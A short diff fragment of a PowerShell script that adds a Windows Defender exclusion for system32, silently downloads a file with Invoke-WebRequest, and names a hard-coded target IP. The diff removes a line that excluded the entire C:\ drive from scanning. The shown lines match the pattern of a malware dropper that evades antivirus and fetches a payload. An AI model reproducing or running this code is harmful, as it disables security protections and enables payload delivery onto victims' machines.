@@ -109,7 +109,6 @@ Add-MpPreference -ExclusionPath $system32Path
 $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $url -OutFile $filePath
 
-Add-MpPreference -ExclusionPath "C:\"
 Start-Sleep -Seconds 5
 
 $targetIP = "172.84.94.22"
